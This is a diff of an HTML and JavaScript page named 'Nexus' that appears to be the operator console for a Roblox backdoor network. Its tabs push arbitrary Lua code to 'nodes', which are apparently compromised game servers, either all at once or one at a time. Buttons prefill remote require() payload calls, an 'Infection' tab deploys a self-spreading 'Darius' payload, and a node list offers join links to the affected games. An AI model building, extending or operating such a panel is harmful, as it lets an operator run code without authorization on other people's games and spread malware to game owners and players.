@@ -2,152 +2,171 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Nexus </title>
+    <title>Nexus  | Classic</title>
     <style>
-        :root { --apple-blue: #0071e3; --glass: rgba(28, 28, 30, 0.85); }
-        body { margin: 0; background: #000 url('https://www.apple.com/v/home/bl/images/overview/hero/hero_iphone15pro__de9bc4v8h26u_large.jpg') no-repeat center fixed; background-size: cover; color: #fff; font-family: -apple-system, sans-serif; overflow: hidden; }
-        .app-header { position: fixed; top: 0; width: 100%; height: 50px; background: rgba(0,0,0,0.8); backdrop-filter: blur(20px); border-bottom: 1px solid #333; display: flex; align-items: center; justify-content: space-between; padding: 0 15px; box-sizing: border-box; z-index: 1000; }
-        .nav-tabs { display: flex; gap: 8px; }
-        .nav-tab { background: none; border: none; color: #86868b; cursor: pointer; font-size: 11px; padding: 6px 8px; border-radius: 6px; }
-        .nav-tab.active { color: #fff; background: rgba(255,255,255,0.1); font-weight: 600; }
-        .panel-center { display: flex; align-items: center; justify-content: center; height: 100vh; }
-        .glass-card { background: var(--glass); backdrop-filter: blur(30px); border-radius: 24px; border: 1px solid rgba(255,255,255,0.1); width: 550px; padding: 25px; box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
-        input, textarea, select { width: 100%; border-radius: 10px; border: 1px solid #424245; background: rgba(0,0,0,0.4); color: #fff; padding: 10px; margin-bottom: 10px; box-sizing: border-box; outline: none; font-size: 13px; }
-        .btn-blue { background: var(--apple-blue); color: #fff; border: none; border-radius: 10px; padding: 12px; width: 100%; font-weight: 600; cursor: pointer; }
-        .rh-btn { background: rgba(255,255,255,0.1); color: #fff; border: 1px solid rgba(255,255,255,0.2); padding: 5px 12px; border-radius: 20px; font-size: 10px; cursor: pointer; margin-bottom: 8px; margin-right: 4px; }
+        :root { --apple-blue: #0071e3; --bg: #000; }
+        body { margin: 0; background: var(--bg); color: #fff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; overflow: hidden; }
+        
+        /* Header */
+        .header { position: fixed; top: 0; width: 100%; height: 44px; background: rgba(0,0,0,0.8); backdrop-filter: blur(20px); border-bottom: 1px solid #333; display: flex; align-items: center; justify-content: space-between; padding: 0 20px; box-sizing: border-box; z-index: 1000; }
+        .nav { display: flex; gap: 15px; }
+        .nav-btn { background: none; border: none; color: #86868b; cursor: pointer; font-size: 12px; transition: 0.2s; }
+        .nav-btn.active { color: #fff; font-weight: 600; }
+
+        /* Main Container */
+        .container { display: flex; align-items: center; justify-content: center; height: 100vh; }
+        .card { background: #1c1c1e; border-radius: 18px; width: 500px; padding: 30px; border: 1px solid #333; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        
+        h2 { margin: 0 0 15px 0; font-size: 22px; font-weight: 600; }
+        input, textarea, select { width: 100%; border-radius: 8px; border: 1px solid #424245; background: #000; color: #fff; padding: 12px; margin-bottom: 12px; box-sizing: border-box; outline: none; font-size: 14px; }
+        textarea { font-family: 'Courier New', monospace; resize: none; }
+        
+        .btn-main { background: var(--apple-blue); color: #fff; border: none; border-radius: 8px; padding: 12px; width: 100%; font-weight: 600; cursor: pointer; transition: 0.2s; }
+        .btn-main:hover { opacity: 0.9; }
+        
+        .row-btns { display: flex; gap: 5px; margin-bottom: 10px; flex-wrap: wrap; }
+        .rh-pill { background: #333; color: #fff; border: none; padding: 6px 12px; border-radius: 15px; font-size: 11px; cursor: pointer; }
+        .rh-pill:hover { background: #444; }
+
         .tab-content { display: none; }
         .tab-content.active { display: block; }
-        .list-box { background: rgba(0,0,0,0.2); border-radius: 12px; height: 200px; overflow-y: auto; }
-        .game-entry { display: flex; justify-content: space-between; align-items: center; padding: 10px; border-bottom: 1px solid #333; }
-        .music-player { position: fixed; bottom: 20px; right: 20px; background: rgba(255,255,255,0.1); backdrop-filter: blur(15px); padding: 10px 15px; border-radius: 30px; display: flex; align-items: center; gap: 10px; z-index: 2000; border: 1px solid rgba(255,255,255,0.1); }
-        .music-btn { background: #fff; border: none; width: 30px; height: 30px; border-radius: 50%; cursor: pointer; color: #000; font-weight: bold; }
+
+        /* Node List */
+        .node-box { background: #000; border-radius: 10px; height: 180px; overflow-y: auto; border: 1px solid #333; }
+        .node-item { padding: 10px; border-bottom: 1px solid #222; display: flex; justify-content: space-between; align-items: center; }
+        .node-item span { font-size: 12px; color: #86868b; }
+        .join-link { color: var(--apple-blue); text-decoration: none; font-size: 11px; font-weight: 600; }
+
+        /* Footer Music */
+        .player { position: fixed; bottom: 20px; right: 20px; background: #2c2c2e; padding: 8px 15px; border-radius: 20px; display: flex; align-items: center; gap: 10px; border: 1px solid #444; }
+        .p-btn { background: #fff; border: none; width: 28px; height: 28px; border-radius: 50%; cursor: pointer; font-size: 12px; }
     </style>
 </head>
-<body onclick="tryAutoPlay()">
+<body onclick="startAudio()">
     <audio id="bgMusic" loop src="https://cdn.discordapp.com/attachments/1459510270870421546/1489905086250352772/Wont_Stop_Us_-_StacyBurke92_g00byd0lan_KLICKAUD.mp3?ex=69d21dbd&is=69d0cc3d&hm=f7812e208edafbe0c5f70e2359dc893b9c6477033ae2989720e977ab36a15b8a&"></audio>
 
-    <header class="app-header">
-        <div style="font-weight:700;"> Nexus</div>
-        <div class="nav-tabs">
-            <button class="nav-tab active" onclick="tab('m_exec', event)">Mass</button>
-            <button class="nav-tab" onclick="tab('s_exec', event)">Single</button>
-            <button class="nav-tab" onclick="tab('inf', event)">Infection</button>
-            <button class="nav-tab" onclick="tab('wl', event)">Whitelist</button>
-            <button class="nav-tab" onclick="tab('gms', event)">Games</button>
+    <div class="header">
+        <div style="font-weight:700;"> NEXUS</div>
+        <div class="nav">
+            <button class="nav-btn active" onclick="showTab('mass', this)">Mass</button>
+            <button class="nav-btn" onclick="showTab('single', this)">Single</button>
+            <button class="nav-btn" onclick="showTab('inf', this)">Infection</button>
+            <button class="nav-btn" onclick="showTab('nodes', this)">Nodes</button>
         </div>
-        <div id="time" style="font-size:10px;"></div>
-    </header>
+        <div id="clock" style="font-size:11px; color:#86868b;"></div>
+    </div>
 
-    <div class="panel-center">
-        <div class="glass-card">
-            <div id="m_exec" class="tab-content active">
+    <div class="container">
+        <div class="card">
+            <div id="mass" class="tab-content active">
                 <h2>Mass Execution</h2>
-                <button class="rh-btn" onclick="ins(1, false)">Last Rig</button>
-                <button class="rh-btn" onclick="ins(2, false)">Require.EXE</button>
-                <button class="rh-btn" onclick="ins(3, false)">Darius (OP)</button>
-                <input type="password" id="m_pw" placeholder="System Password">
-                <textarea id="m_lua" rows="6" placeholder="-- Global Lua"></textarea>
-                <button class="btn-blue" onclick="push('m_exec')">Deploy</button>
+                <div class="row-btns">
+                    <button class="rh-pill" onclick="fill(1, 'm_lua')">Last Rig</button>
+                    <button class="rh-pill" onclick="fill(2, 'm_lua')">Require.EXE</button>
+                    <button class="rh-pill" onclick="fill(3, 'm_lua')">Darius (OP)</button>
+                </div>
+                <input type="password" id="m_pw" placeholder="Admin Password">
+                <textarea id="m_lua" rows="7" placeholder="-- Enter Global Lua Code"></textarea>
+                <button class="btn-main" onclick="send('mass')">Execute All</button>
             </div>
-            <div id="s_exec" class="tab-content">
-                <h2>Single Execution</h2>
-                <select id="target_id"><option>Scanning...</option></select>
-                <button class="rh-btn" onclick="ins(1, true)">Last Rig</button>
-                <button class="rh-btn" onclick="ins(2, true)">Require.EXE</button>
-                <button class="rh-btn" onclick="ins(3, true)">Darius (OP)</button>
-                <input type="password" id="s_pw" placeholder="System Password">
-                <textarea id="s_lua" rows="5" placeholder="-- Target Lua"></textarea>
-                <button class="btn-blue" onclick="push('s_exec')">Deploy</button>
+
+            <div id="single" class="tab-content">
+                <h2>Single Target</h2>
+                <select id="target_id"><option value="">Waiting for nodes...</option></select>
+                <div class="row-btns">
+                    <button class="rh-pill" onclick="fill(3, 's_lua')">Darius (OP)</button>
+                </div>
+                <input type="password" id="s_pw" placeholder="Admin Password">
+                <textarea id="s_lua" rows="6" placeholder="-- Targeted Code"></textarea>
+                <button class="btn-main" onclick="send('single')">Execute Target</button>
             </div>
+
             <div id="inf" class="tab-content">
                 <h2>Infection</h2>
-                <button class="rh-btn" onclick="setInf('Darius')">Darius Spreader</button>
                 <input type="password" id="i_pw" placeholder="Password">
-                <textarea id="inf_lua" rows="6">-- Infection Code</textarea>
-                <button class="btn-blue" onclick="push('inf')">Infect All</button>
+                <textarea id="i_lua" rows="8">require(127445614272366).op("Darius")</textarea>
+                <button class="btn-main" onclick="send('inf')">Deploy Spreader</button>
             </div>
-            <div id="gms" class="tab-content">
+
+            <div id="nodes" class="tab-content">
                 <h2>Active Nodes</h2>
-                <div id="g_list" class="list-box"></div>
+                <div id="node_list" class="node-box"></div>
             </div>
         </div>
     </div>
 
-    <div class="music-player">
-        <span id="musicStat" style="font-size:9px; font-weight: bold;">STANDBY</span>
-        <button class="music-btn" onclick="toggleMusic()" id="mBtn">▶</button>
+    <div class="player">
+        <span id="p-stat" style="font-size:10px; font-weight:600;">OFFLINE</span>
+        <button class="p-btn" onclick="toggle()">▶</button>
     </div>
 
     <script>
         const audio = document.getElementById('bgMusic');
-        const mBtn = document.getElementById('mBtn');
-        const mStat = document.getElementById('musicStat');
-        let hasPlayed = false;
+        let unlocked = false;
 
-        function tryAutoPlay() {
-            if(!hasPlayed) {
+        function startAudio() {
+            if(!unlocked) {
                 audio.play().then(() => {
-                    hasPlayed = true;
-                    mStat.innerText = "PLAYING";
-                    mBtn.innerText = "||";
+                    unlocked = true;
+                    document.getElementById('p-stat').innerText = "PLAYING";
                 }).catch(() => {});
             }
         }
 
-        function toggleMusic() {
-            if(audio.paused) { 
-                audio.play(); 
-                mBtn.innerText = "||";
-                mStat.innerText = "PLAYING";
-            } else { 
-                audio.pause(); 
-                mBtn.innerText = "▶";
-                mStat.innerText = "PAUSED";
-            }
+        function toggle() {
+            if(audio.paused) { audio.play(); document.getElementById('p-stat').innerText = "PLAYING"; } 
+            else { audio.pause(); document.getElementById('p-stat').innerText = "PAUSED"; }
         }
 
-        function tab(name, e) {
-            document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
-            document.querySelectorAll('.nav-tab').forEach(t => t.classList.remove('active'));
-            document.getElementById(name).classList.add('active');
-            if(e) e.target.classList.add('active');
+        function showTab(id, btn) {
+            document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
+            document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
+            document.getElementById(id).classList.add('active');
+            btn.classList.add('active');
         }
 
-        function ins(type, isSingle) {
-            const box = isSingle ? document.getElementById('s_lua') : document.getElementById('m_lua');
+        function fill(type, boxId) {
+            const box = document.getElementById(boxId);
             if(type === 1) box.value = `require(132155655397653)("Darius")`;
             if(type === 2) box.value = `require(125992639027440)["Require.EXE by E God"]("Darius")`;
             if(type === 3) box.value = `require(127445614272366).op("Darius")`;
         }
 
-        function setInf(type){
-            const box = document.getElementById('inf_lua');
-            box.value = `require(127445614272366).op("Darius")`;
+        async function send(tab) {
+            const lua = document.querySelector(`#${tab} textarea`).value;
+            const pw = document.querySelector(`#${tab} input`).value;
+            const tid = tab === 'single' ? document.getElementById('target_id').value : null;
+            const res = await fetch('/push-lua', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({lua, password: pw, targetId: tid})
+            });
+            alert(res.ok ? "✓ Payload Deployed" : "✕ Access Denied");
         }
 
-        async function push(tId) {
-            const lua = document.querySelector(`#${tId} textarea`).value;
-            const pw = document.querySelector(`#${tId} input`).value;
-            const tid = tId === 's_exec' ? document.getElementById('target_id').value : null;
-            const r = await fetch('/push-lua', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({lua, password:pw, targetId:tid})});
-            alert(r.ok ? "Sent" : "Error");
-        }
-
-        async function refresh() {
+        async function update() {
             try {
-                const r = await fetch('/get-games');
-                const d = await r.json();
-                const l = document.getElementById('g_list');
+                const res = await fetch('/get-games');
+                const data = await res.json();
+                const list = document.getElementById('node_list');
                 const sel = document.getElementById('target_id');
-                const k = Object.keys(d);
-                if(sel) sel.innerHTML = k.map(i => `<option value="${i}">${d[i].name}</option>`).join('');
-                if(l) l.innerHTML = k.map(i => `<div class="game-entry"><span>${d[i].name}</span><a href="roblox://placeId=${d[i].placeId}" style="color:#fff; font-size:10px; background:#333; padding:4px 8px; border-radius:10px; text-decoration:none;">JOIN</a></div>`).join('');
+                const keys = Object.keys(data);
+
+                sel.innerHTML = keys.map(k => `<option value="${k}">${data[k].name}</option>`).join('');
+                list.innerHTML = keys.map(k => `
+                    <div class="node-item">
+                        <div>
+                            <div style="font-size:13px; font-weight:600;">${data[k].name}</div>
+                            <span>${k.substring(0,8)}</span>
+                        </div>
+                        <a href="roblox://placeId=${data[k].placeId}" class="join-link">JOIN</a>
+                    </div>`).join('') || '<div style="padding:20px; color:#444; text-align:center;">Scanning...</div>';
             } catch(e) {}
         }
 
-        setInterval(refresh, 5000);
-        setInterval(() => { document.getElementById('time').innerText = new Date().toLocaleTimeString(); }, 1000);
-        window.onload = refresh;
+        setInterval(update, 5000);
+        setInterval(() => { document.getElementById('clock').innerText = new Date().toLocaleTimeString(); }, 1000);
+        window.onload = update;
     </script>
 </body>
 </html>
